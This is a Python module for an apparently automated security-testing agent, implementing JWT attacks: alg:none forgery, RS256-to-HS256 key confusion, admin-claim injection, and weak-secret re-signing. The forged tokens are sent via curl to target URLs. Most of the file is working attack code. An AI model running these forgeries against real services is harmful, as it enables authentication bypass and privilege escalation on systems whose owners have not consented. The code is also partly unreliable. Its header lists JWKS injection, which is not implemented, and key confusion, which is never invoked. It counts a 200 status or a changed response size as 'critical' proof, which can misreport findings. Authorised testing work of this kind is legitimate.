"""
JWT Attack Suite — deterministic tests with unambiguous proof.

Tests:
1. alg:none attack (strip signature)
2. Key confusion (RS256 → HS256 with public key)
3. Weak secret brute force
4. Claim manipulation (role, exp, iat)
5. JWKS injection
6. Token leakage in URLs/headers
"""

import base64
import json
import hashlib
import hmac
from typing import Dict, List, Any, Optional
from skills.base import BaseSkill, SkillResult


# Common weak JWT secrets to try
WEAK_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "key",
    "changeme", "admin", "test", "debug", "supersecret",
    "your-256-bit-secret", "shhhhh", "keyboard cat",
    "symmetric_key", "public_key", "token_secret",
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> Optional[Dict]:
    """Decode JWT without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception:
        return None


def forge_jwt_none(original_token: str) -> Optional[str]:
    """Forge JWT with alg:none attack."""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        
        # Change algorithm to none
        header["alg"] = "none"
        
        # Encode new header and payload
        new_header = b64url_encode(json.dumps(header).encode())
        new_payload = b64url_encode(json.dumps(payload).encode())
        
        return f"{new_header}.{new_payload}."
    except Exception:
        return None


def forge_jwt_key_confusion(original_token: str, public_key_pem: str) -> Optional[str]:
    """
    Forge JWT using key confusion attack (RS256 → HS256).
    Signs with the public key as HMAC secret.
    """
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        
        # Change algorithm to HS256
        header["alg"] = "HS256"
        
        # Encode
        new_header = b64url_encode(json.dumps(header).encode())
        signing_input = f"{new_header}.{b64url_encode(json.dumps(payload).encode())}"
        
        # Sign with public key as HMAC secret
        signature = hmac.new(
            public_key_pem.encode(),
            signing_input.encode(),
            hashlib.sha256
        ).digest()
        
        new_sig = b64url_encode(signature)
        return f"{signing_input}.{new_sig}"
    except Exception:
        return None


def forge_jwt_admin(original_token: str) -> Optional[str]:
    """Forge JWT with admin role claim."""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        
        # Inject admin claims
        payload["role"] = "admin"
        payload["admin"] = True
        payload["is_admin"] = True
        payload["permissions"] = ["admin", "read", "write", "delete"]
        
        # Remove expiration check
        if "exp" in payload:
            payload["exp"] = 9999999999
        
        # Encode
        new_header = b64url_encode(json.dumps(header).encode())
        new_payload = b64url_encode(json.dumps(payload).encode())
        
        # Keep original signature (may still work if server doesn't verify)
        return f"{new_header}.{new_payload}.{parts[2]}"
    except Exception:
        return None


def check_token_in_response(response_body: str) -> List[str]:
    """Extract JWT tokens leaked in response body."""
    import re
    # JWT pattern: three base64url segments separated by dots
    pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    return list(set(re.findall(pattern, response_body)))


class JWTAttackSkill(BaseSkill):
    """
    JWT attack suite — deterministic tests with clear proof.
    
    Each test produces a forged token. Proof = server accepts the forged token.
    """

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["jwt", "jwt_attack", "token", "auth"]

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        urls = context.get("urls", [])
        target = context.get("target", "")
        
        findings = []
        
        # Scan for leaked tokens
        for url in urls[:10]:
            leaked = await self._scan_for_tokens(url)
            if leaked:
                findings.extend(leaked)
        
        # Test JWT endpoints if we have tokens
        for url in urls[:5]:
            jwt_findings = await self._test_jwt_endpoint(url)
            findings.extend(jwt_findings)

        return SkillResult(
            success=True,
            findings=findings,
            data={"urls_tested": len(urls), "jwt_findings": len(findings)},
            next_skills=["validate"],
            confidence=min(len(findings) / 3, 1.0) if findings else 0.0,
        )

    async def _scan_for_tokens(self, url: str) -> List[Dict]:
        """Scan URL and response for leaked JWT tokens."""
        findings = []
        
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-L", "--max-time", "10",
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            body = stdout.decode(errors="ignore")
            
            # Check for JWT in response body
            tokens = check_token_in_response(body)
            for token in tokens[:3]:
                decoded = decode_jwt(token)
                if decoded:
                    # Check for weak algorithm
                    alg = decoded["header"].get("alg", "")
                    if alg.lower() == "none":
                        findings.append({
                            "type": "jwt_alg_none",
                            "url": url,
                            "severity": "critical",
                            "confidence": 0.95,
                            "cvss_score": 9.8,
                            "evidence": f"JWT with alg:none found: {token[:50]}...",
                            "payload": token,
                            "param": "Authorization",
                            "description": "JWT with alg:none algorithm — signature bypass possible",
                            "source_tool": "jwt-attack",
                        })
                    
                    # Check for weak/missing claims
                    payload = decoded["payload"]
                    if "role" in payload or "admin" in payload:
                        findings.append({
                            "type": "jwt_claim_manipulation",
                            "url": url,
                            "severity": "high",
                            "confidence": 0.7,
                            "cvss_score": 7.5,
                            "evidence": f"JWT with sensitive claims: {json.dumps(payload)}",
                            "payload": token,
                            "param": "Authorization",
                            "description": f"JWT contains role/admin claims that may be manipulable",
                            "source_tool": "jwt-attack",
                        })
        except Exception:
            pass
        
        return findings

    async def _test_jwt_endpoint(self, url: str) -> List[Dict]:
        """Test a specific JWT-protected endpoint."""
        findings = []
        
        # First, get a token from the endpoint
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10",
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Extract token from Authorization header or response
            import re
            auth_match = re.search(r'Authorization:\s*[Bb]earer\s+(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', response)
            if not auth_match:
                tokens = check_token_in_response(response)
                if tokens:
                    token = tokens[0]
                else:
                    return findings
            else:
                token = auth_match.group(1)
            
            decoded = decode_jwt(token)
            if not decoded:
                return findings
            
            # Test 1: alg:none
            none_token = forge_jwt_none(token)
            if none_token and none_token != token:
                # Send forged token
                result = await self._send_token(url, none_token)
                if result and result.get("status") == 200:
                    findings.append({
                        "type": "jwt_alg_none_bypass",
                        "url": url,
                        "severity": "critical",
                        "confidence": 0.95,
                        "cvss_score": 9.8,
                        "evidence": f"alg:none forged token accepted: {result.get('status')}",
                        "payload": none_token,
                        "original_token": token,
                        "param": "Authorization",
                        "description": "JWT alg:none attack succeeded — server accepts unsigned tokens",
                        "source_tool": "jwt-attack",
                    })
            
            # Test 2: Admin claim injection
            admin_token = forge_jwt_admin(token)
            if admin_token and admin_token != token:
                result = await self._send_token(url, admin_token)
                if result and result.get("status") == 200:
                    # Check if response differs from original
                    original_result = await self._send_token(url, token)
                    if original_result and len(result.get("body", "")) != len(original_result.get("body", "")):
                        findings.append({
                            "type": "jwt_claim_injection",
                            "url": url,
                            "severity": "critical",
                            "confidence": 0.85,
                            "cvss_score": 9.0,
                            "evidence": f"Admin claim injection accepted — response size changed",
                            "payload": admin_token,
                            "original_token": token,
                            "param": "Authorization",
                            "description": "JWT claim injection — admin role accepted by server",
                            "source_tool": "jwt-attack",
                        })
            
            # Test 3: Try weak secrets
            for secret in WEAK_SECRETS[:5]:
                try:
                    parts = token.split(".")
                    header = json.loads(b64url_decode(parts[0]))
                    payload = json.loads(b64url_decode(parts[1]))
                    
                    # Re-sign with weak secret
                    new_header = b64url_encode(json.dumps(header).encode())
                    signing_input = f"{new_header}.{b64url_encode(json.dumps(payload).encode())}"
                    signature = hmac.new(
                        secret.encode(),
                        signing_input.encode(),
                        hashlib.sha256
                    ).digest()
                    weak_token = f"{signing_input}.{b64url_encode(signature)}"
                    
                    result = await self._send_token(url, weak_token)
                    if result and result.get("status") == 200:
                        findings.append({
                            "type": "jwt_weak_secret",
                            "url": url,
                            "severity": "critical",
                            "confidence": 0.9,
                            "cvss_score": 9.0,
                            "evidence": f"Weak secret '{secret}' accepted for signing",
                            "payload": weak_token,
                            "original_token": token,
                            "param": "Authorization",
                            "description": f"JWT signed with weak secret: {secret}",
                            "source_tool": "jwt-attack",
                        })
                        break
                except Exception:
                    continue
            
        except Exception:
            pass
        
        return findings

    async def _send_token(self, url: str, token: str) -> Optional[Dict]:
        """Send request with JWT token."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10",
                "-H", f"Authorization: Bearer {token}",
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Parse status
            import re
            status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', response)
            status = int(status_match.group(1)) if status_match else 0
            
            return {"status": status, "body": response}
        except Exception:
            return None


import asyncio
